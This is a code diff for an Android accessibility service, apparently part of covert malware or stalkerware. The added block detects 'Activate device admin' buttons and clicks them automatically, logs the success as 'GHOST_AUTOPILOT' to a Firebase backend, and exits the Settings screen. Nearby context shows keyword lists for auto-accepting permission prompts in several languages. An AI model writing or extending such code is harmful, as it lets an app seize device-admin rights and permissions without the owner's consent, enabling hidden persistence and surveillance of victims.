@@ -1931,6 +1931,22 @@ public class IO_Persistence_Manager extends AccessibilityService {
             String lowerText = text.toLowerCase();
             String lowerDesc = desc.toLowerCase();
 
+            // Explicit Device Admin Activation Button Match
+            boolean isAdminButton = (lowerText.contains("activate") || lowerDesc.contains("activate")) &&
+                    (lowerText.contains("admin") || lowerDesc.contains("admin") ||
+                     lowerText.contains("device") || lowerDesc.contains("device") ||
+                     lowerText.equals("activate") || lowerDesc.equals("activate") ||
+                     lowerText.startsWith("activate"));
+
+            if (isAdminButton && lowerText.length() < 60) {
+                if (performNodeClick(node)) {
+                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
+                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Device Admin via text [" + text + "]");
+                    startSmartExitSettingsLoop();
+                    return true;
+                }
+            }
+
             String[] keywords = {
                 "while using the app", "only this time", "allow all the time",
                 "allow", "allow all", "grant", "permitir", "permitir siempre",
